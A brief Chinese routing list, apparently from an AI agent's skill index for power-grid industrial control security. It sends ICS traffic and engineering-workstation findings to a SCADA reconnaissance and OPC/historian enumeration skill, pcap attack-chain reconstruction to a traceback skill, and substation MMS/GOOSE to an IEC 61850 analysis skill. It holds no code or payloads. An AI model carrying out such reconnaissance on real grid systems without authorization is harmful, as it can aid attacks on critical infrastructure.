- 抓到 `s7comm` 与 `mbtcp` 混合流量、或发现工程师站 → `f2x-power-scada-recon`（工程师站识别与 OPC/历史库枚举）。
- 拿到 pcap 需还原完整攻击链、输出防守检测点 → `f2x-power-traceback`。
- 变电站侧 MMS/GOOSE → `f2x-power-iec61850-analysis`。
